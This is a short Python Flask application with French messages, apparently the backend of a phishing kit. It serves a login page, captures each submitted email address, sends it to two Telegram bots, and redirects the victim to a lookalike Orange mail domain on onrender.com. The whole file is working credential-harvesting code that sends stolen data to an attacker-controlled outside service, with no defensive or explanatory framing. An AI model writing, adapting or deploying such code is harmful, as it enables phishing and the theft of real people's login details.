from dotenv import load_dotenv
load_dotenv()

from flask import Flask, request, redirect, render_template
import requests
import os

app = Flask(__name__)

BOT_TOKEN_1 = os.getenv("TELEGRAM_BOT_TOKEN_1")
CHAT_ID_1 = os.getenv("TELEGRAM_CHAT_ID_1")
BOT_TOKEN_2 = os.getenv("TELEGRAM_BOT_TOKEN_2")
CHAT_ID_2 = os.getenv("TELEGRAM_CHAT_ID_2")

def envoyer_telegram(bot_token, chat_id, message):
    try:
        url = f"https://api.telegram.org/bot{bot_token}/sendMessage"
        params = {"chat_id": chat_id, "text": message}
        r = requests.get(url, params=params)
        print(f"Envoi à {chat_id} -> Status: {r.status_code}")
        print(r.text)
    except Exception as e:
        print(f"Erreur envoi vers {chat_id} :", e)

@app.route('/', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        email = request.form.get('email')
        message = f"🔐 Nouvelle tentative d'identification\n📧 Adresse: {email}"

        envoyer_telegram(BOT_TOKEN_1, CHAT_ID_1, message)
        envoyer_telegram(BOT_TOKEN_2, CHAT_ID_2, message)

        return redirect("https://orange-mail-1.onrender.com/")
    return render_template('login.html')

if __name__ == '__main__':
    app.run(debug=True)